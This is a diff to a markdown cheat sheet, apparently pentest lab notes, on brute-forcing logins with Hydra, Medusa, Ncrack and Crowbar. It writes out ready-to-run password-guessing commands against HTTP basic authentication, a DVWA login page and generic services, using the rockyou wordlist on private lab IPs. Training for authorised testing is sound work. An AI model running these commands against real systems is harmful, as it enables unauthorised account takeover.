@@ -1,4 +1,4 @@
-###### Hydra
+# Hydra
 
 Login page attack
 
@@ -17,10 +17,10 @@ hydra -I -l bob -P /opt/rockyou.txt "http-get://10.10.6.224/protected:A=BASIC"
 ```
 
 ---
-#medusa
+# Medusa
 
 ```sh
-#medusa -h <IP> -u user -P wordlist.lst -M <module> 
+medusa -h <IP> -u user -P wordlist.lst -M <module> 
 ```
 
 HTTP htaccess Attack with medusa (Basic Authentication)
@@ -31,13 +31,13 @@ Les pages avec les popus JS pour l'authentification qui utilise une protecter `.
 medusa -h 192.168.45.130 -u user -P /opt/rocyou.txt -M http -m DIR:/dvwa/login.php 
 ```
 
-#ncrack
+# Ncrack
 
 ```sh
 ncrack -vv -U user.lst -P /opt/rocyou.txt <target-ip>:<protocol>
 ```
 
-#crowbar
+# Crowbar
 
 Remote Desktop Protocl Attack with Crowbar
 
